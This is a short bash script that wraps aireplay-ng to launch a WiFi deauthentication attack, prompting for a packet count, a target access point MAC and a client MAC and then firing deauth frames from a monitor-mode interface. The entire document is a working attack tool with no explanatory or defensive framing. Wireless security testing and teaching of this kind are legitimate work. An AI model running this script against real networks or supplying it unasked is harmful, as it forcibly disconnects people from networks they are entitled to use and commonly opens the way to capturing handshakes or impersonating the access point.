#! /bin/bash
# aireplay-deauth-client

echo Starting AIREPLAY-NG in AP-Client deauth mode...
echo Enter number of deauths
read -p 'Number of deauths to send: ' deauthvar
echo Enter target WiFi AP MAC
read -p 'WiFi AP: ' bssidvar
echo Enter Client MAC
read -p 'Client MAC: ' clientvar
aireplay-ng -0 $deauthvar -a $bssidvar -c $clientvar wlan0mon
echo Deauth finished!
